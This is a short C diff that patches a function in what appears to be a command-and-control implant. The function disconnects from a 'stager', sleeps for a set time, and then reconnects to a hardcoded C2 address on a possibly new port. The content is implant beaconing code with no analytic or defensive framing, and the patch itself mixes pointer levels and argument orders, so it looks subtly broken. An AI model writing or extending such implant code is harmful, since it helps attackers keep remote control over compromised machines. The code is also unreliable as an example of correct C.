@@ -21,22 +21,24 @@ cleanup:
 
 // Otherwise, the stager wants us to disconnect, go to sleep, then reconnect at a possibly different port 
     // We will replace our client fd with a new established fd after reconnecting 
-int handleDisconnectSleep(int* client_fd, uint64_t sleep_time, uint64_t port)
+int handleDisconnectSleep(int** client_fd, uint64_t sleep_time, uint64_t port)
 {
     int status = 1;
     const char* ip_address = "172.17.0.3";
 
     // Disconnect
-    close(client_fd);
+    close(**client_fd);
+
+    **client_fd = -1;
 
     // Sleep for specified time
     printf("Sleeping for %i seconds...\n", (sleep_time/1000));
-    sleep(sleep_time);
+    sleep(sleep_time/1000);
 
     // Now just callout again (C2 should be expecting us on this port)
     printf("Attempting to reconnect to C2...\n");
 
-    if (!callout(sleep_time, ip_address, client_fd))
+    if (!callout(*client_fd, ip_address, port))
     {
         printf("Failed to re-establish connection to C2\n");
         status = 0;
